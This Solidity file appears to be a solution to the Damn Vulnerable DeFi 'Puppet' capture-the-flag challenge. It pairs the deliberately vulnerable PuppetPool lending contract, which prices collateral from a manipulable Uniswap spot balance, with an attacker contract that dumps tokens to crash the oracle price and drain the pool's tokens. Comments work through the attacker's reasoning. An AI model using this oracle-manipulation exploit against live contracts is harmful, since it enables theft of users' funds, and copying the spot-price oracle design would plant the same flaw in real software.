// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

interface UniswapV1 {
    function tokenToEthSwapInput(uint256 tokensToSell, uint256 minETHReturned, uint256 deadling) external returns (uint256);
    function tokenAddress() external returns (address);
}


contract MakeMonies {
    constructor(UniswapV1 uniswapPair, DamnValuableToken token, PuppetPool pool, uint8 v, bytes32 r, bytes32 s) payable {
        // transfer 'em tokens
        token.permit(msg.sender, address(this), type(uint256).max, type(uint256).max, v, r, s);
        token.transferFrom(msg.sender, address(this), token.balanceOf(msg.sender));
        token.approve(address(uniswapPair), token.balanceOf(address(this)));        
        
        // make that trade
        uniswapPair.tokenToEthSwapInput(token.balanceOf(address(this)), 1, block.timestamp + 2000);
        pool.borrow{value: pool.calculateDepositRequired(100_000 * 10 ** 18)}(100_000 * 10 ** 18, msg.sender);
    }
}

/**
 * @title PuppetPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract PuppetPool is ReentrancyGuard {
    using Address for address payable;

    uint256 public constant DEPOSIT_FACTOR = 2;

    address public immutable uniswapPair;
    DamnValuableToken public immutable token;

    mapping(address => uint256) public deposits;

    error NotEnoughCollateral();
    error TransferFailed();

    event Borrowed(address indexed account, address recipient, uint256 depositRequired, uint256 borrowAmount);

    constructor(address tokenAddress, address uniswapPairAddress) {
        token = DamnValuableToken(tokenAddress);
        uniswapPair = uniswapPairAddress;
    }

    // Allows borrowing tokens by first depositing two times their value in ETH
    function borrow(uint256 amount, address recipient) external payable nonReentrant {
        uint256 depositRequired = calculateDepositRequired(amount);

        if (msg.value < depositRequired)
            revert NotEnoughCollateral();

        if (msg.value > depositRequired) {
            unchecked {
                payable(msg.sender).sendValue(msg.value - depositRequired);
            } // will return extra deposit to msg.sender
        }

        unchecked {
            deposits[msg.sender] += depositRequired; 
        }

        // Fails if the pool doesn't have enough tokens in liquidity
        if(!token.transfer(recipient, amount))
            revert TransferFailed();

        emit Borrowed(msg.sender, recipient, depositRequired, amount);
        // goal: make deposit equal to zero so all of DVT can be sent
    }

    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
        // deposit (of ETH) required is the pool's [ETH/DVT] balance times 2
        // e.g. ETH = 4, DVT = 2, deposit == 4
        //      ETH = 2, DVT = 4, desosit == 1  <-- make DVT waaaaaaay higher 
        //      ETH = 1, DVT = 1, deposit == 2  
        // goal: make deposit required equal to zero
        // initial ratio: 10   : 10
        // have:          25   : 1000
        // can make pool: 10   : 1100 -> issue: pool's ratio not high enough to drain?
        // Goal: make pool's balance of DVT way higher (todo: take out ETH)
    }

    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
        // price is ETH / DVT inflated by 10**18
    }
}
